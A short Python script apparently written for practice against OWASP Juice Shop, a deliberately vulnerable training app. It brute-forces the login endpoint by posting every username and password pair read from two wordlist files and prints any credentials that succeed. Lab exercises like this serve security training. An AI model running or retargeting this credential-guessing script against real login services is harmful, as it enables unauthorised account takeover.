import requests

def password_brute_http(username):
    try:
        with open("passwords.txt") as file:
            for line in file:
                endpoint = "http://owaspjuiceshop:3000/rest/user/login"
                data = {"email":username,"password":line.strip()}
                response = requests.post(url = endpoint , data = data)
                if response.status_code == 200:
                    print(f"worked! use password {line.strip()} for username {username}")
                    return
            else:
                print(f"correct password not found for username {username}")
    except Exception as e:
        print(f"something went wrong")

def username_brute():
    with open("usernames.txt") as file:
        for line in file:
            username = line.strip()
            password_brute_http(username)

username_brute()